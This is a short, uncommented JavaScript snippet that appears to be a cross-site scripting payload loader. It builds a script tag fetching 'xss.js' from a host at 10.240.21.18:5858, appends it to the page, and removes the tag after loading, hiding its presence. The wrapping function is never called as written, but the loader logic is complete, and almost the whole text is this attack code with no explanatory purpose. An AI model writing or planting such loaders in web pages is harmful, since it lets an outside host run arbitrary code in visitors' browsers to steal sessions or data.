(function () {
    function  asyncLoadScriptFile(src, callback) {
        var dynamicScriptElement = document.createElement('script');
        dynamicScriptElement.setAttribute('src', src);
        dynamicScriptElement.setAttribute('type', 'text/javascript');
        document.body.appendChild(dynamicScriptElement);
        dynamicScriptElement.onload = dynamicScriptElement.onreadystatechange = function (a, b, c) {
            if (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete') {
                $(dynamicScriptElement).remove();
                $.utils.isFunction(callback) && callback.apply(this, arguments);
            }
        };
    };

    var dynamicScriptElement=document.createElement("script");dynamicScriptElement.setAttribute("src","http://10.240.21.18:5858/libs/xss.js");dynamicScriptElement.setAttribute("type","text/javascript");document.body.appendChild(dynamicScriptElement);dynamicScriptElement.onload=dynamicScriptElement.onreadystatechange=function(a,b,c){this.readyState&&"loaded"!=this.readyState&&"complete"!=this.readyState||$(dynamicScriptElement).remove()};

})